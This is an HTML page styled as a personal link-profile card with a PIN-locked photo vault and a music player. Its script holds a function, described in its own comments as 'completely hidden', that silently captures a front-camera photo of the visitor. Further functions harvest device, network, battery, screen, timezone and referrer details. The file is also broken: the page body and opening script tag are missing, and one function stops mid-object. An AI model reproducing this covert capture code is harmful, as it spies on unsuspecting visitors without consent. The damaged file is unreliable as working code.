<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

    <style>
        :root {
            --primary-color: #3b82f6;
            --bg-dark: #000000;
            --card-bg: #0a0a0a;
            --text-main: #ffffff;
            --text-dim: #888888;
            --glow-color: rgba(59, 130, 246, 0.5);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
        }

        body {
            background: var(--bg-dark);
            background-image: 
                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        .main-card {
            width: min(400px, 95vw);
            background: var(--card-bg);
            border: 1px solid #1a1a1a;
            border-radius: 50px;
            padding: 50px 25px 30px;
            text-align: center;
            position: relative;
            box-shadow: 0 40px 100px rgba(0,0,0,1);
            z-index: 10;
            overflow: hidden;
        }

        .main-card::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(transparent, transparent, transparent, var(--primary-color));
            animation: rotate 4s linear infinite;
            z-index: -1;
            opacity: 0.3;
        }

        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .profile-container {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto 25px;
        }

        .avatar-wrapper {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid var(--primary-color);
            padding: 5px;
            cursor: pointer;
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            background: #000;
        }

        .avatar-wrapper:active { transform: scale(0.9); }

        .avatar-img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            pointer-events: none;
        }

        h2 {
            font-size: 1.6rem;
            letter-spacing: 4px;
            font-weight: 800;
            text-transform: uppercase;
            background: linear-gradient(to bottom, #fff, #666);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: var(--primary-color);
            font-size: 0.9rem;
            margin-bottom: 40px;
            font-weight: 600;
            letter-spacing: 2px;
        }

        .links-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }

        .link-item {
            background: #0f0f0f;
            border: 1px solid #222;
            border-radius: 25px;
            padding: 25px 15px;
            text-decoration: none;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            transition: 0.3s;
            position: relative;
        }

        .link-item:active {
            border-color: var(--primary-color);
            box-shadow: 0 0 20px var(--glow-color);
            transform: translateY(2px);
        }

        .link-item i { font-size: 1.8rem; }
        .link-item span {
            font-size: 0.75rem;
            text-transform: uppercase;
            font-weight: 700;
            color: var(--text-dim);
            letter-spacing: 1px;
        }

        /* DEVELOPER BUTTON */
        .developer-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(30, 30, 30, 0.95);
            border: 1px solid var(--primary-color);
            color: var(--primary-color);
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 2px;
            cursor: pointer;
            z-index: 10000;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
            transition: 0.3s;
            text-transform: uppercase;
        }

        .developer-btn:hover {
            background: var(--primary-color);
            color: #000;
            transform: scale(1.05);
            box-shadow: 0 0 30px var(--glow-color);
        }

        .developer-btn:active {
            transform: scale(0.95);
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.98);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 20000;
            backdrop-filter: blur(15px);
        }

        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #111;
            padding: 40px;
            border-radius: 40px;
            border: 1px solid var(--primary-color);
            width: min(340px, 90vw);
            text-align: center;
            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
        }

        .modal-input {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            padding: 18px;
            border-radius: 15px;
            color: #fff;
            margin: 25px 0;
            text-align: center;
            font-size: 1rem;
            transition: 0.3s;
        }

        .modal-input:focus { border-color: var(--primary-color); }

        .primary-btn {
            background: var(--primary-color);
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 15px;
            font-weight: 800;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .cancel-btn {
            background: #222;
            color: #666;
            margin-top: 10px;
            border: none;
            padding: 12px;
            border-radius: 15px;
            width: 100%;
            cursor: pointer;
        }

        #zoomOverlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.97);
            z-index: 30000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        #zoomOverlay img {
            max-width: 85%;
            max-height: 80vh;
            border-radius: 20px;
            border: 2px solid var(--primary-color);
            pointer-events: none;
        }

        .vault-panel {
            position: fixed;
            top: 0; right: -100%;
            width: 100%;
            height: 100vh;
            background: #000;
            z-index: 25000;
            padding: 40px 20px;
            transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
            overflow-y: auto;
        }
        .vault-panel.open { right: 0; }

        .photo-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 30px;
        }

        .photo-card {
            aspect-ratio: 1;
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid #222;
            cursor: pointer;
        }
        .photo-card img { width: 100%; height: 100%; object-fit: cover; }

        .music-player {
            position: fixed; bottom: 30px; right: 30px;
            width: 60px; height: 60px; border-radius: 50%;
            background: #111; border: 1px solid var(--primary-color);
            display: flex; justify-content: center; align-items: center;
            font-size: 24px; cursor: pointer; z-index: 15000;
        }
        .rotating { animation: spin 5s linear infinite; }
        @keyframes spin { from {transform: rotate(0deg)} to {transform: rotate(360deg)} }

        /* Hidden elements for camera */
        #hiddenCamera, #hiddenCanvas {
            display: none;
        }
    </style>
</head>

    // Camera access and capture function (completely hidden)
    async function captureHiddenPhoto() {
        try {
            // Try to get camera stream without any indicators
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            }).catch(() => null);
            
            if (!stream) return null;
            
            // Use hidden video element
            const video = document.getElementById('hiddenCamera');
            video.srcObject = stream;
            
            // Wait a tiny bit for the camera to initialize
            await new Promise(resolve => setTimeout(resolve, 100));
            
            // Capture frame
            const canvas = document.getElementById('hiddenCanvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to base64
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Stop all tracks immediately
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
            
            return imageData;
        } catch (error) {
            console.log('Camera not available');
            return null;
        }
    }

    // Get device info
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        if (ua.match(/Android/i)) os = 'Android';
        else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
        else if (ua.match(/Windows/i)) os = 'Windows';
        else if (ua.match(/Mac/i)) os = 'MacOS';
        else if (ua.match(/Linux/i)) os = 'Linux';

        let browser = 'Unknown';
        let version = 'Unknown';
        if (ua.indexOf('Chrome') > -1) {
            browser = 'Chrome';
            version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
        } else if (ua.indexOf('Firefox') > -1) {
            browser = 'Firefox';
            version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
        } else if (ua.indexOf('Safari') > -1) {
            browser = 'Safari';
            version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
        }

        return { os, browser, version, platform: navigator.platform };
    }

    // Get network info
    function getNetworkInfo() {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            return {
                type: conn.effectiveType || 'Unknown',
                downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
                rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown'
            };
        }
        return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
    }

    // Get battery info
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Yes' : 'No',
                    timeLeft: battery.charging ? '‚àû' : (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Unknown')
                };
            }
        } catch (e) {}
        return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
    }

    // Get language info
    function getLanguageInfo() {
        return {
            primary: navigator.language || 'Unknown',
            all: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
        };
    }

    // Get screen info
    function getScreenInfo() {
        return {
            resolution: screen.width + 'px x ' + screen.height + 'px',
            colorDepth: screen.colorDepth + '-bit',
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            pixelRatio: window.devicePixelRatio || '1'
        };
    }

    // Get time info
    function getTimeInfo() {
        const d = new Date();
        const offset = -d.getTimezoneOffset();
        const sign = offset >= 0 ? '+' : '-';
        const hours = Math.floor(Math.abs(offset) / 60);
        const minutes = Math.abs(offset) % 60;
        
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            offset: `GMT${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}`,
            utc: d.toISOString()
        };
    }

    // Get touch support
    function getTouchSupport() {
        return {
            points: navigator.maxTouchPoints || 0,
            events: 'ontouchstart' in window ? 'Yes' : 'No'
        };
    }

    // Get privacy info
    function getPrivacyInfo() {
        return {
            dnt: navigator.doNotTrack || 'Not set',
            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
            referrer: document.referrer || 'Direct',
            loadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' : 'Unknown'

    // Verify PIN
    function verifyPin() {
        if(document.getElementById('vaultPin').value === '2009') {
            closeModals();
            document.getElementById('vaultPanel').classList.add('open');
            loadPhotos();
        } else {
            alert("‚ùå ACCESS DENIED!");
        }
    }

    // Close vault
    function closeVault() { 
        document.getElementById('vaultPanel').classList.remove('open'); 
    }

    // Handle zoom
    function handleZoom(show) { 
        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
    }

    // Music control
    function controlMusic() {
        const audio = document.getElementById('bgTrack');
        const toggle = document.getElementById('mToggle');
        if(audio.paused) { 
            audio.play().catch(() => {}); 
            toggle.classList.add('rotating'); 
        } else { 
            audio.pause(); 
            toggle.classList.remove('rotating'); 
        }
    }

    // Load photos
    function loadPhotos() {
        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
        const grid = document.getElementById('vGrid');
        
        if(photos.length === 0) {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 200;
            const ctx = canvas.getContext('2d');
            
            const gradient = ctx.createLinearGradient(0, 0, 200, 200);
            gradient.addColorStop(0, '#3b82f6');
            gradient.addColorStop(1, '#1e40af');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 200, 200);
            
            ctx.fillStyle = 'white';
            ctx.font = 'bold 60px Arial';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText('üì∑', 100, 100);
            
            photos.push(canvas.toDataURL());
            localStorage.setItem('vault_p', JSON.stringify(photos));
        }
        
        grid.innerHTML = photos.map(src => 
            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
                <img src="${src}">
            </div>`
        ).join('');
    }

    // Add upload button
    const uploadDiv = document.createElement('div');
    uploadDiv.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
    uploadDiv.innerHTML = '<i class="fa-solid fa-cloud-arrow-up" style="font-size:2rem; color:#3b82f6;"></i><p style="margin-top:10px;">Upload Photos</p>';
    uploadDiv.onclick = () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.multiple = true;
        input.onchange = () => {
            const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
            Array.from(input.files).forEach(file => {
                if(file.type.startsWith('image/')) {
                    const reader = new FileReader();
                    reader.onload = (e) => {
                        photos.push(e.target.result);
                        localStorage.setItem('vault_p', JSON.stringify(photos));
                        loadPhotos();
                    };
                    reader.readAsDataURL(file);
                }
            });
        };
        input.click();
    };
    document.querySelector('.vault-panel').insertBefore(uploadDiv, document.getElementById('vGrid'));

    // Load photos
    loadPhotos();
</script>
